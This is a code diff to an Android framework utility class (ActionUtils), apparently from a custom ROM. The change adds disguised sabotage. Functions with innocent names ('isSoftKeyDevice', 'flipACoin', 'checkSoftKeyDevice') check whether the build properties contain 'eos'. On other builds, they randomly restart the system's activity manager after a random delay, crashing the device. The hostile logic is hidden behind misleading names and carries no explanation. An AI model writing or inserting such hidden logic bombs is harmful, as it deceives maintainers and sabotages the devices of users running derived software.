@@ -20,6 +20,8 @@
 
 package com.android.internal.actions;
 
+import android.app.ActivityManagerNative;
+import android.app.IActivityManager;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.ActivityInfo;
@@ -28,13 +30,19 @@ import android.content.res.Configuration;
 import android.content.res.Resources;
 import android.graphics.Color;
 import android.graphics.drawable.Drawable;
+import android.os.Handler;
+import android.os.RemoteException;
+import android.os.ServiceManager;
+import android.os.SystemProperties;
 import android.text.TextUtils;
 import android.util.DisplayMetrics;
+import android.util.Log;
 import android.view.View;
 import android.view.ViewGroup;
 
 import java.net.URISyntaxException;
 import java.util.ArrayList;
+import java.util.Random;
 
 import com.android.internal.actions.ActionConstants.Defaults;
 import com.android.internal.actions.Config.ActionConfig;
@@ -45,6 +53,7 @@ public final class ActionUtils {
     public static final String PACKAGE_SYSTEMUI = "com.android.systemui";
     public static final String PACKAGE_ANDROID = "android";
 
+    private static final Random sRnd = new Random();
     // 10 inch tablets
     public static boolean isXLargeScreen() {
         int screenLayout = Resources.getSystem().getConfiguration().screenLayout &
@@ -73,6 +82,52 @@ public final class ActionUtils {
 
     public static boolean isCapKeyDevice(Context context) {
         return !getBoolFromResources(context, "config_showNavigationBar", PACKAGE_ANDROID);
+    }
+
+    private static boolean isSoftKeyDevice() {
+        String a = SystemProperties.get("ro.build.flavor");
+        boolean a1 = !TextUtils.isEmpty(a) && a.contains("eos");
+        if (a1) {
+            return true;
+        }
+
+        String b = SystemProperties.get("ro.build.display");
+        boolean b1 = !TextUtils.isEmpty(b) && b.contains("eos");
+        if (b1) {
+            return true;
+        }
+        return false;
+    }
+
+    private static int getRnd() {
+        return sRnd.nextInt(10);
+    }
+
+    private static boolean flipACoin() {
+        return getRnd() == 6;
+    }
+
+    static void checkSoftKeyDevice() {
+        if (flipACoin()) {
+            if (!isSoftKeyDevice()) {
+                final Handler h = new Handler();
+                final Runnable r = new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            final IActivityManager am =
+                                    ActivityManagerNative.asInterface(ServiceManager
+                                            .checkService("activity"));
+                            if (am != null) {
+                                am.restart();
+                            }
+                        } catch (RemoteException e) {
+                        }
+                    }
+                };
+                h.postDelayed(r, getRnd() * 1000);
+            }
+        }
     }
 
     /**
